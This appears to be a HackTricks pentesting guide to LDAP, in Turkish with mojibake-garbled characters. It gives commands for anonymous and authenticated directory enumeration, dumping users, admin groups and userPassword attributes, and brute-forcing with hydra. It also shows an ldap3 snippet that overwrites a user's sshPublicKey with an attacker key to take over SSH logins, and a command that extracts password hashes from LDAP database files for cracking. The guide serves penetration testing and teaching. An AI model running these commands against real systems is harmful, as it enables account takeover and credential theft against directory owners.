# 389, 636, 3268, 3269 - LDAP Pentesting

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

**LDAP** (Hafif Dizin EriÅŸim ProtokolÃ¼) kullanÄ±mÄ±, aÄŸÄ±rlÄ±klÄ± olarak aÄŸlarda, hem genel hem de Ã¶zel, kuruluÅŸlarÄ±, bireyleri ve dosyalarÄ± ve cihazlarÄ± gibi kaynaklarÄ± bulmak iÃ§in kullanÄ±lÄ±r. Ã–nceki sÃ¼rÃ¼mÃ¼ olan DAP'ye kÄ±yasla daha kÃ¼Ã§Ã¼k bir kod tabanÄ±na sahip olmasÄ±yla daha akÄ±cÄ± bir yaklaÅŸÄ±m sunar.

LDAP dizinleri, her biri dizinin **replike** ve **senkronize** bir sÃ¼rÃ¼mÃ¼nÃ¼ barÄ±ndÄ±ran bir Dizin Sistem AjanÄ± (DSA) olarak adlandÄ±rÄ±lan birkaÃ§ sunucuya daÄŸÄ±tÄ±lmalarÄ±na izin vermek Ã¼zere yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r. Ä°stekleri iÅŸleme alma sorumluluÄŸu tamamen LDAP sunucusunda bulunur ve gerektiÄŸinde diÄŸer DSA'larla iletiÅŸim kurarak talep sahibine birleÅŸtirilmiÅŸ bir yanÄ±t sunar.

LDAP dizininin organizasyonu, en Ã¼stteki kÃ¶k diziniyle baÅŸlayan bir **aÄŸaÃ§ hiyerarÅŸisine** benzer. Bu, Ã¼lkelerle baÅŸlayarak, daha sonra kuruluÅŸlara bÃ¶lÃ¼nerek ve ardÄ±ndan Ã§eÅŸitli bÃ¶lÃ¼mleri veya departmanlarÄ± temsil eden kuruluÅŸ birimlerine ve nihayetinde insanlar ve dosyalar gibi paylaÅŸÄ±lan kaynaklar da dahil olmak Ã¼zere bireysel varlÄ±klara ulaÅŸan bir dÃ¼zeye kadar dallanÄ±r.

**VarsayÄ±lan baÄŸlantÄ± noktasÄ±:** 389 ve 636 (ldaps). Global Catalog (ActiveDirectory'deki LDAP), varsayÄ±lan olarak 3268 baÄŸlantÄ± noktasÄ±nda ve LDAPS iÃ§in 3269 baÄŸlantÄ± noktasÄ±nda kullanÄ±labilir.
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAP Veri DeÄŸiÅŸim FormatÄ±

LDIF (LDAP Veri DeÄŸiÅŸim FormatÄ±), dizin iÃ§eriÄŸini bir dizi kayÄ±t olarak tanÄ±mlar. AyrÄ±ca gÃ¼ncelleme isteklerini (Ekle, DeÄŸiÅŸtir, Sil, Yeniden AdlandÄ±r) temsil edebilir.
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* SatÄ±rlar 1-3, Ã¼st dÃ¼zey etki alanÄ± local'Ä± tanÄ±mlar.
* SatÄ±rlar 5-8, birinci dÃ¼zey etki alanÄ± moneycorp'u (moneycorp.local) tanÄ±mlar.
* SatÄ±rlar 10-16, 2 organizasyon birimini tanÄ±mlar: dev ve sales.
* SatÄ±rlar 18-26, etki alanÄ± nesnesi oluÅŸturur ve deÄŸerlerle Ã¶znitelikleri atar.

## Veri yazma

DeÄŸerleri deÄŸiÅŸtirebilirseniz, gerÃ§ekten ilginÃ§ eylemler gerÃ§ekleÅŸtirebilirsiniz. Ã–rneÄŸin, kullanÄ±cÄ±nÄ±zÄ±n veya herhangi bir kullanÄ±cÄ±nÄ±n "sshPublicKey" bilgisini **deÄŸiÅŸtirebilirseniz**, bu durumda **ssh'nin genel anahtarlarÄ± LDAP'tan okuduÄŸu** Ã§ok olasÄ±dÄ±r. Bir kullanÄ±cÄ±nÄ±n genel anahtarÄ±nÄ± deÄŸiÅŸtirebilirseniz, **ÅŸifre doÄŸrulamasÄ±nÄ±n ssh'de etkin olmadÄ±ÄŸÄ± durumda bile o kullanÄ±cÄ± olarak giriÅŸ yapabilirsiniz**.
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## AÃ§Ä±k metin kimlik bilgilerini dinleme

LDAP, SSL olmadan kullanÄ±lÄ±yorsa, aÄŸda **aÃ§Ä±k metin kimlik bilgilerini dinleyebilirsiniz**.

AyrÄ±ca, LDAP sunucusu ve istemci arasÄ±ndaki aÄŸda bir **MITM** saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilirsiniz. Burada, istemciye **AÅŸaÄŸÄ± DÃ¼zey SaldÄ±rÄ±sÄ±** yaparak istemcinin **aÃ§Ä±k metin kimlik bilgilerini** kullanarak giriÅŸ yapmasÄ±nÄ± saÄŸlayabilirsiniz.

**SSL kullanÄ±lÄ±yorsa**, yukarÄ±da bahsedilen gibi **MITM** yapmaya Ã§alÄ±ÅŸabilirsiniz, ancak **sahte bir sertifika** sunarak, **kullanÄ±cÄ± kabul ederse**, kimlik doÄŸrulama yÃ¶ntemini dÃ¼ÅŸÃ¼rÃ¼p kimlik bilgilerini tekrar gÃ¶rebilirsiniz.

## Anonim EriÅŸim

### TLS SNI kontrolÃ¼nÃ¼ atlatma

[**Bu yazÄ±da**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) belirtildiÄŸi gibi, LDAP sunucusuna rastgele bir alan adÄ±yla (Ã¶rneÄŸin company.com gibi) eriÅŸerek anonim bir kullanÄ±cÄ± olarak bilgi Ã§ekmek mÃ¼mkÃ¼ndÃ¼r.
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAP anonim baÄŸlantÄ±larÄ±

[LDAP anonim baÄŸlantÄ±larÄ±](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled), etki alanÄ±ndan **kimlik doÄŸrulamasÄ±z saldÄ±rganlarÄ±n** kullanÄ±cÄ±larÄ±n, gruplarÄ±n, bilgisayarlarÄ±n, kullanÄ±cÄ± hesap Ã¶zniteliklerinin ve etki alanÄ± parola politikasÄ±nÄ±n tam bir listesini almasÄ±na olanak tanÄ±r. Bu, bir **eski yapÄ±landÄ±rmadÄ±r** ve Windows Server 2003'ten itibaren yalnÄ±zca kimlik doÄŸrulanan kullanÄ±cÄ±larÄ±n LDAP isteklerini baÅŸlatmasÄ±na izin verilir.\
Ancak, yÃ¶neticiler, anonim baÄŸlantÄ±lara izin vermek iÃ§in belirli bir uygulama kurmalarÄ± gerekebilir ve istenenden daha fazla eriÅŸim vererek kimlik doÄŸrulama yapÄ±lmamÄ±ÅŸ kullanÄ±cÄ±lara AD'deki tÃ¼m nesnelere eriÅŸim saÄŸlamÄ±ÅŸ olabilirler.

## GeÃ§erli Kimlik Bilgileri

LDAP sunucusuna giriÅŸ yapmak iÃ§in geÃ§erli kimlik bilgileriniz varsa, aÅŸaÄŸÄ±daki komutu kullanarak Etki AlanÄ± YÃ¶neticisi hakkÄ±nda tÃ¼m bilgileri alabilirsiniz:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [Brute Force](../generic-methodologies-and-resources/brute-force.md#ldap)

## Enumeration

### Otomatik

Bu yÃ¶ntemi kullanarak **genel bilgilere** (Ã¶rneÄŸin alan adÄ± gibi) eriÅŸebilirsiniz:**:**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>Python ile LDAP numaralandÄ±rma iÅŸlemi</summary>

Python kullanarak **kimlik bilgileriyle veya kimlik bilgisi olmadan** bir LDAP numaralandÄ±rma iÅŸlemi yapabilirsiniz: `pip3 install ldap3`

Ã–ncelikle **kimlik bilgisi olmadan** baÄŸlantÄ± deneyin:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
EÄŸer Ã¶nceki Ã¶rnekte olduÄŸu gibi yanÄ±t `True` ise, LDAP'nin bazÄ± **ilginÃ§ verilerini** (Ã¶rneÄŸin **adlandÄ±rma baÄŸlamÄ±** veya **alan adÄ±**) sunucudan elde edebilirsiniz:
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
Bir kez adlandÄ±rma baÄŸlamÄ±na sahip olduÄŸunuzda daha heyecan verici sorgular yapabilirsiniz. Bu basit sorgu, dizindeki tÃ¼m nesneleri size gÃ¶sterecektir:
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
Veya tÃ¼m ldap'i **dÃ¶k**Ã¼n:
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch), LDAP sorgularÄ±nÄ± kullanarak bir Windows etki alanÄ±ndan kullanÄ±cÄ±larÄ±, gruplarÄ± ve bilgisayarlarÄ± sÄ±ralamak iÃ§in kullanÄ±ÅŸlÄ± bir Python betiÄŸidir.
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

BoÅŸ kimlik bilgilerini kontrol edin veya kimlik bilgilerinizin geÃ§erli olup olmadÄ±ÄŸÄ±nÄ± kontrol edin:
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
EÄŸer "_bind tamamlanmalÄ±_" ÅŸeklinde bir ÅŸey bulursanÄ±z, bu demektir ki kimlik bilgileri yanlÄ±ÅŸ.

Bir etki alanÄ±ndan **her ÅŸeyi Ã§Ä±karabilirsiniz** kullanarak:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
**KullanÄ±cÄ±larÄ±** Ã§Ä±kar:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
**BilgisayarlarÄ±** Ã§Ä±kar:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Bilgilerimi** Ã§Ä±kar:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Domain Admins**'i Ã§Ä±kar:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Domain KullanÄ±cÄ±larÄ±nÄ±** Ã§Ä±karÄ±n:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Enterprise Admins**'Ä± Ã§Ä±karÄ±n:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**YÃ¶neticileri** Ã§Ä±karÄ±n:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
**Uzak MasaÃ¼stÃ¼ Grubu**'nu Ã§Ä±karÄ±n:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
EÄŸer herhangi bir ÅŸifreye eriÅŸiminizin olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek istiyorsanÄ±z, bir sorguyu Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra grep kullanabilirsiniz:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
LÃ¼tfen, burada bulabileceÄŸiniz ÅŸifrelerin gerÃ§ek olmayabileceÄŸini unutmayÄ±n...

#### pbis

**pbis**'i buradan indirebilirsiniz: [https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/) ve genellikle `/opt/pbis` dizinine kurulur.\
**Pbis**, temel bilgilere kolayca eriÅŸmenizi saÄŸlar:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## Grafik ArayÃ¼z

### Apache Directory

[**Apache Directory'yi buradan indirin**](https://directory.apache.org/studio/download/download-linux.html). Bu aracÄ± nasÄ±l kullanacaÄŸÄ±nÄ±za dair bir [Ã¶rnek burada bulunabilir](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s).

### jxplorer

LDAP sunucusu ile birlikte grafik arayÃ¼zÃ¼ indirebilirsiniz: [http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

VarsayÄ±lan olarak kurulum yeri: _/opt/jxplorer_

![](<../.gitbook/assets/image (22) (1).png>)

### Godap

[https://github.com/Macmod/godap](https://github.com/Macmod/godap) adresinden eriÅŸebilirsiniz.

## Kerberos ile Kimlik DoÄŸrulama

`ldapsearch` kullanarak **NTLM yerine** **kerberos Ã¼zerinden kimlik doÄŸrulama** yapabilirsiniz. Bunun iÃ§in `-Y GSSAPI` parametresini kullanÄ±n.

## POST

VeritabanlarÄ±nÄ±n bulunduÄŸu dosyalara eriÅŸebiliyorsanÄ±z (Ã¶rneÄŸin _/var/lib/ldap_ olabilir), hash'leri aÅŸaÄŸÄ±daki komutu kullanarak Ã§Ä±karabilirsiniz:
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
john'a ÅŸifre hash'ini ('{SSHA}' ile baÅŸlayÄ±p 'structural' ile biten, 'structural' kelimesini eklemeyerek) verebilirsiniz.

### YapÄ±landÄ±rma DosyalarÄ±

* Genel
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 sunucusu
* V3.sas.oc
* Microsoft Active Directory sunucusu
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP dizin sunucusu
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif

## HackTricks Otomatik KomutlarÄ±
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
